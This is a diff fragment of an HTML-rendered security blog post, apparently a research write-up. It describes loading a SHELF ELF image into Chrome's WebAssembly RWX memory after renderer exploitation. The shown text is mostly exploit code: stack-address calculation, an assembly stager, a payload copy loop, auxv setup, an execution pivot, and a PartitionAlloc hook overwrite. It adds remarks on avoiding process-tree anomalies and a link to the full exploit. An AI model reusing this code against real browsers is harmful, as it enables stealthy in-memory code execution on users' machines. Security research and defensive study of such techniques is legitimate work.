-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// setting a safe address for SHELF stack
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// setting a safe address for SHELF stack
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">let</span> shelf_stack <span style="color:#ff79c6">=</span> (stack_leak<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x80000</span>n)  <span style="color:#ff79c6">&amp;</span> <span style="color:#ff79c6">~</span>(<span style="color:#bd93f9">0xfff</span>n);
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> shelf_delta <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">Number</span>(sizeof_Elf64_Ehdr <span style="color:#ff79c6">+</span> (BigInt(G_AT_PHNUM) <span style="color:#ff79c6">*</span> sizeof_Elf64_Phdr));</span></span></code></pre></div>
 Then we have to copy our SHELF image to our RWX region, and write a stager where the original ELF headers would have been at the beginning of our SHELF image. This stager is in charge of jumping to the SHELF entrypoint and setting the right stack address before doing so:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">/* [stager] :
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">/* [stager] :
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4">    48 b8 42 42 42 42 42 42 42 42       movabs rax,0x4242424242424242
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4">    48 89 c4                            mov rsp,rax
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4">    48 31 db                            xor rbx,rbx
@@ -1437,7 +1430,7 @@ Then we have to copy our SHELF image to our RWX region, and write a stager where
 </span></span><span style="display:flex;"><span>    wasm_accessor.setUint8(shelf_delta<span style="color:#ff79c6">+</span>i, payload[i]);
 </span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
 At this point, all we have left to do is to write the SHELF image <code>Elf64_Auxv_t</code> instance in the SHELF&rsquo;s stack:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> phdr_addr <span style="color:#ff79c6">=</span> ftoi(stable_addrof(phdr)) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x28</span>n;
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> phdr_addr <span style="color:#ff79c6">=</span> ftoi(stable_addrof(phdr)) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x28</span>n;
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> phdr_addr_bstore <span style="color:#ff79c6">=</span> heap_accesor.getBigUint64(<span style="color:#8be9fd;font-style:italic">Number</span>(phdr_addr <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>n), <span style="color:#ff79c6">true</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>stack_accesor.setBigUint64(<span style="color:#bd93f9">0x00</span>, AT_PHDR, <span style="color:#ff79c6">true</span>);
@@ -1478,13 +1471,13 @@ Overall, the layout of our SHELF Image can be shown in the diagram below:</p>
 </figure>
 </p>
 <p>To pivot control of execution to our RWX region, we can use our wasm function accessor to do:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>wasm_entry();</span></span></code></pre></div>Alternatively, if we would like to use any other technique to generate a RWX region, we can overwritte <code>PartitionAllocs</code> hooks to do so, much like we would do with <code>__free_hook</code> or <code>__malloc_hook</code> for glibc:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">//base::PartitionAllocHooks::hooks_enabled_
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>wasm_entry();</span></span></code></pre></div>Alternatively, if we would like to use any other technique to generate a RWX region, we can overwritte <code>PartitionAllocs</code> hooks to do so, much like we would do with <code>__free_hook</code> or <code>__malloc_hook</code> for glibc:</p>
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">//base::PartitionAllocHooks::hooks_enabled_
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>chrome_accesor.setUint8(kHooksEnabled, <span style="color:#bd93f9">1</span>);
 </span></span><span style="display:flex;"><span><span style="color:#6272a4">//base::PartitionAllocHooks::free_observer_hook_
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>chrome_accesor.setBigUint64(kFreeObserverHook, ftoi(rwx_page_addr), <span style="color:#ff79c6">true</span>);</span></span></code></pre></div>
 Below is a screenshot of our test involving the execution of a SHELF image compiled with <em>libm</em> on Chrome launched with the following flags :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chrome --no-sandbox --user-data-dir<span style="color:#ff79c6">=</span>/tmp</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chrome --no-sandbox --user-data-dir<span style="color:#ff79c6">=</span>/tmp</span></span></code></pre></div>
 <p>
 
 
@@ -1510,7 +1503,7 @@ Below is a screenshot of our test involving the execution of a SHELF image compi
 </figure>
 </p>
 <p>if we check the process tree of chrome we will see the following:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>    ├─chrome,104737   	   &lt;-- Browser Process
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>    ├─chrome,104737   	   &lt;-- Browser Process
 </span></span><span style="display:flex;"><span>    │   ├─chrome,104739
 </span></span><span style="display:flex;"><span>    │   │   ├─chrome,104762  &lt;-- GPU Process
 </span></span><span style="display:flex;"><span>    │   │       ....
@@ -1529,7 +1522,7 @@ Below is a screenshot of our test involving the execution of a SHELF image compi
 </span></span><span style="display:flex;"><span>    │   │   │   └─{chrome},105004</span></span></code></pre></div>
 As we can observe, there are no anomalies in process-tree hierarchy.
 This is a simple visual example, but I hope it will give the reader a glance of what kind of capability we can achieve with SHELF loading. The full exploit can be found <a href="https://github.com/ulexec/ChromeSHELFLoader">here</a></p>
-<!-- raw HTML omitted -->
+<br />
 <hr>
 <h2 class="heading" id="conclusion">
   Conclusion
